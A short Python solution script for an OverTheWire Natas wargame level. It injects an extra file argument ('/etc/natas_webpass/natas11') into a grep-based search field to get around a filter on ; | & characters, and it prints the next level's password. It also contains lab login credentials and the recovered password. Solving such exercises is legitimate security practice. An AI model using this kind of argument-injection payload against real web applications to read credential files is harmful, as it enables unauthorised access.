# command injection filter bypass.  Character not allowed [;|&]
import requests 
from bs4 import BeautifulSoup

url="http://natas10.natas.labs.overthewire.org"
auth_user="natas10"
auth_pass="D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"

payload="a /etc/natas_webpass/natas11"
params={'needle':payload,'search':'submit'}
r= requests.post(url,auth=(auth_user,auth_pass),data=params,verify=False)
soup= BeautifulSoup(r.text,features="lxml")
for par in soup.find_all('pre'):
    lst=par.string.split("\n")    
print(f"natas 11 pass :{lst[1]}")
#natas 11 pass - 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg